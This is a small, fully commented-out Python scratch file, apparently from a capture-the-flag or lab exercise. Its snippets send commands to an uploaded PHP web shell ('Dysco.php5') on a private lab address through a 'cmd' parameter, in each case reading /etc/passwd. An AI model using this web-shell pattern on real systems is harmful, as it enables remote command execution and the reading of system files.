# import requests
#
# url="http://10.10.195.15/uploads/Dysco.php5"
# cmd="cat /etc/passwd | grep test"
# response = requests.get(url, {'cmd':cmd})
# print(response.content)
#
# import requests; print(requests.get(url, {'cmd':cmd}))
#
# import urllib.parse
#
# from urllib import parse, request
# cmd="cat /etc/passwd | grep test"
# print(parse.quote(cmd))

# from urllib import parse, request;print(request. get('${target_url}',{'cmd':'${command}'}))


# from urllib import (parse, request);
# url="http://10.10.195.15/uploads/Dysco.php5"
# cmd="cat /etc/passwd | grep test"
# response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
# print(response)
